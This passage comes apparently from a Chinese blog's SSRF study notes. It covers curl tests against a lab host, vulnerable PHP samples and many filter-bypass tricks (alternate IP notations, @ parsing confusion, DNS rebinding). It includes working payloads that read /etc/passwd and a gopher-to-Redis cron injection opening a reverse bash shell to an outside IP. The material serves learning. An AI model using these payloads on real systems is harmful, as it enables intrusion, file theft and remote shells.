    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: <span class="token interpolation"><span class="token variable">$schema</span></span>://<span class="token interpolation"><span class="token variable">$ip</span></span>/<span class="token interpolation"><span class="token variable">$query</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: <span class="token interpolation"><span class="token variable">$schema</span></span>://<span class="token interpolation"><span class="token variable">$ip</span></span>:<span class="token interpolation"><span class="token variable">$port</span></span>/<span class="token interpolation"><span class="token variable">$query</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>
</code></pre> 
<h5><a id="_385"></a>利用测试</h5> 
<pre><code class="prism language-php"><span class="token comment"># dict protocol - 探测Redis</span>
dict<span class="token punctuation">:</span><span class="token comment">//127.0.0.1:6379/info  </span>
curl <span class="token operator">-</span>vvv <span class="token string single-quoted-string">'http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info'</span>

<span class="token comment"># file protocol - 任意文件读取</span>
curl <span class="token operator">-</span>vvv <span class="token string single-quoted-string">'http://sec.com:8082/ssrf2.php?url=http://sec.com:8082/302.php?s=file&amp;query=/etc/passwd'</span>

<span class="token comment"># gopher protocol - 一键反弹Bash</span>
<span class="token comment"># * 注意: gopher跳转的时候转义和`url`入参的方式有些区别</span>
curl <span class="token operator">-</span>vvv <span class="token string single-quoted-string">'http://sec.com:8082/ssrf_only_http_s.php?url=http://sec.com:8082/302.php?s=gopher&amp;i=127.0.0.1&amp;p=6389&amp;query=_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/103.21.140.84/6789%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d
%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'</span>
</code></pre> 
<h4><a id="_401"></a>高级利用方式</h4> 
<p>这部分太难了，等以后用到了才看吧。<a href="https://mp.weixin.qq.com/s/0wdxfetcp8TUtLZFWI16uA" rel="nofollow">干货 | SSRF漏洞利用总结</a></p> 
<h5><a id="Redis_405"></a>攻击内网Redis</h5> 
<h5><a id="FastCGI_407"></a>攻击内网FastCGI</h5> 
<h5><a id="MySql_409"></a>攻击内网MySql</h5> 
<h3><a id="_411"></a>绕过姿势</h3> 
<h4><a id="IP_413"></a>更改IP地址写法</h4> 
<p>一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：</p> 
<pre><code>^10(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$
^172.([1][6-9]|[2]\d|3[01])(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
^192.168(.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$
</code></pre> 
<p>对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：</p> 
<pre><code>8进制格式：0300.0250.0.1
16进制格式：0xC0.0xA8.0.1
10进制整数格式：3232235521
16进制整数格式：0xC0A80001
合并后两位：1.1.278 / 1.1.755
合并后三位：1.278 / 1.755 / 3.14159267
</code></pre> 
<p>另外IP中的每一位，各个进制可以混用。</p> 
<p><strong>访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。</strong></p> 
<p>另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。</p> 
<h4><a id="_440"></a>使用解析到内网的域名</h4> 
<p>如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。<br> 另外 xip.io 、xip.name、nip.io、sslip.io提供了一个方便的服务，这个网站的子域名会解析到对应的IP</p> 
<pre><code>192.168.0.1.xip.io &gt;&gt;&gt; 192.168.0.1
localhost &gt;&gt;&gt; 127.0.0.1
http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1
http://0.0.0.0/       # 0.0.0.0这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址
</code></pre> 
<h4><a id="_452"></a>利用@转跳</h4> 
<pre><code>http://www.baidu.com@10.10.10.10 &gt;&gt;&gt; http://10.10.10.10 
</code></pre> 
<p>当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是www.baidu.com ，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com ，而实际上这个URL所请求的内容都是127.0.0.1上的内容。</p> 
<h4><a id="302_460"></a>利用短网址（302转跳）</h4> 
<p>如果服务器使用正则过滤掉了内网的IP地址，那么可以使用短地址转跳的方法。</p> 
<h4><a id="Enclosed_alphanumerics_464"></a>利用Enclosed alphanumerics</h4> 
<p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p> 
<pre><code>利用Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ  Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
</code></pre> 
<h4><a id="_475"></a>利用句号</h4> 
<pre><code>127。0。0。1  &gt;&gt;&gt;  127.0.0.1
</code></pre> 
<h4><a id="IPv6_481"></a>利用IPv6[::]</h4> 
<p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::]</code> <code>0000::1</code> 或IPv6的内网域名来绕过过滤。</p> 
<pre><code>http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1
http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行
</code></pre> 
<h4><a id="_490"></a>利用不存在的协议头绕过指定的协议头</h4> 
<p><code>file_get_contents()</code>函数的一个特性，即当PHP的 <code>file_get_contents()</code> 函数在遇到不认识的协议头时候会将这个协议头当做文件夹，造成目录穿越漏洞，这时候只需不断往上跳转目录即可读到根目录的文件。（include()函数也有类似的特性）</p> 
<p>example：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^https/is'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no hack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>上面的代码限制了url只能是以https开头的路径，那么我们就可以如下：</p> 
<pre><code>httpsssss://
</code></pre> 
<p>此时 <code>file_get_contents()</code> 函数遇到了不认识的伪协议头“httpsssss://”，就会将他当做文件夹，然后再配合目录穿越即可读取文件：</p> 
<pre><code>ssrf.php?url=httpsssss://../../../../../../etc/passwd
</code></pre> 
<p>这个方法可以在SSRF的众多协议被禁止且只能使用它规定的某些协议的情况下来进行读取文件。</p> 
<h4><a id="URL_520"></a>利用URL的解析问题</h4> 
<ul><li><strong>利用readfile和parse_url函数的解析差异绕过指定的端口</strong></li></ul> 
<p>**parse_url()：**本函数解析一个 URL 并返回一个关联数组，包含在 URL 中出现的各种组成部分。</p> 
<p>**readfile()：**读取文件并写入到输出缓冲。</p> 
<p>example：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://'</span><span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>url<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$parsed</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$parsed</span><span class="token punctuation">[</span>port<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">80</span> <span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>  <span class="token comment">// 这里限制了我们传过去的url只能是80端口的</span>
  <span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>用python在当前目录下起一个端口为11211的WEB服务：</p> 
<pre><code>root@ubuntu18:/home/john/Desktop# python -m SimpleHTTPServer 11211
Serving HTTP on 0.0.0.0 port 11211 ...
</code></pre> 
<p>上述代码限制了我们传过去的url只能是80端口的，但如果我们想去读取11211端口的文件的话，我们可以用以下方法绕过：</p> 
<pre><code>http://192.168.91.149/ssrf.php?url=127.0.0.1:11211:80/flag.txt
</code></pre> 
<p><img src="https://images2.imgbox.com/30/01/0zkwBkrd_o.png" alt="image-20210405172345439"></p> 
<p><strong>原理：</strong></p> 
<p><img src="https://images2.imgbox.com/51/72/ADgHRCOs_o.png" alt="image-20210405172901027"></p> 
<p>从上图中可以看出readfile()函数获取的端口是最后冒号<strong>前面的一部分</strong>（11211），而parse_url()函数获取的则是最后冒号<strong>后面的的端口</strong>（80），利用这种差异的不同，从而绕过WAF。</p> 
<p>这两个函数在解析host的时候也有差异，如下图：</p> 
<p>readfile()函数获取的是@号后面一部分（evil.com），而parseurl()函数获取的则是@号前面的一部分（google.com），利用这种差异的不同，我们可以绕过题目中parseurl()函数对指定host的限制。</p> 
<ul><li><strong>利用curl和parse_url的解析差异绕指定的host</strong></li></ul> 
<p><strong>原理：</strong></p> 
<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-3Ne70gDS-1651408635005)(https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210405175634287.png)]</p> 
<p>从上图中可以看到curl()函数解析的是第一个@后面的网址，而parseurl()函数解析的是第二个@后面的网址。利用这个原理我们可以绕过题目中parseurl()函数对指定host的限制。</p> 
<p>example：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token variable">$match_result</span><span class="token operator">=</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(http|https)?:\/\/.*(\/)?.*$/'</span><span class="token punctuation">,</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$match_result</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">try</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$url_parse</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'url fomat error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$hostname</span><span class="token operator">=</span><span class="token variable">$url_parse</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$ip</span><span class="token operator">=</span><span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$hostname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$int_ip</span><span class="token operator">=</span><span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'10.0.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">24</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'172.16.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">20</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">20</span> <span class="token operator">||</span> <span class="token class-name">ip2long</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'192.168.0.0'</span><span class="token punctuation">)</span><span class="token operator">&gt;&gt;</span><span class="token number">16</span> <span class="token operator">==</span> <span class="token variable">$int_ip</span><span class="token operator">&gt;&gt;</span><span class="token number">16</span><span class="token punctuation">;</span><span class="token comment">// 检查是否是内网ip</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function-definition function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">check_inner_ip</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token variable">$url</span><span class="token operator">.</span><span class="token string single-quoted-string">' is inner ip'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$result_info</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token punctuation">{<!-- --></span>
            <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$result_info</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'redirect_url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">safe_request_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>上述代码中可以看到 <code>check_inner_ip</code>函数通过 <code>url_parse()</code>函数检测是否为内网IP，如果不是内网 IP ，则通过 <code>curl()</code> 请求 url 并返回结果，我们可以利用curl和parse_url解析的差异不同来绕过这里的限制，让 <code>parse_url()</code> 处理外部网站网址，最后 <code>curl()</code> 请求内网网址。paylaod如下：</p> 
<pre><code>ssrf.php?url=http://@127.0.0.1:80@www.baidu.com/flag.php
</code></pre> 
<p>不过这个方法在Curl较新的版本里被修掉了，所以我们还可以使用另一种方法，即 <code>0.0.0.0</code>。<code>0.0.0.0</code> 这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址，使用如下即可绕过：</p> 
<pre><code>ssrf.php?url=http://0.0.0.0/flag.php
</code></pre> 
<p>但是这只适用于Linux系统上，Windows系统的不行。</p> 
<h4><a id="DNS_Rebinding_644"></a>DNS Rebinding</h4> 
<p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p> 
<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p> 
<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p> 
<ul><li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li><li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li><li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li><li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li></ul> 
<h3><a id="_657"></a>参考资料</h3> 
<p><a href="https://websec.readthedocs.io/zh/latest/index.html" rel="nofollow">Web安全学习笔记</a></p> 
<p><a href="https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html" rel="nofollow">SSRF漏洞的利用与学习</a></p> 
<p><a href="https://www.anquanke.com/post/id/226240" rel="nofollow">ssrf知识点总结</a></p> 
<p><a href="https://joychou.org/web/phpssrf.html" rel="nofollow">SSRF in PHP</a></p> 
<p><a href="https://mp.weixin.qq.com/s/0wdxfetcp8TUtLZFWI16uA" rel="nofollow">干货 | SSRF漏洞利用总结</a></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/6dbe851ac3cdb350e7850b2d8b4bcdba/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Java的基本程序设计</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/2b7e4e0278e02814f0d985edf1a1a44c/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">操作链表时加入头结点</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 追风少年的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>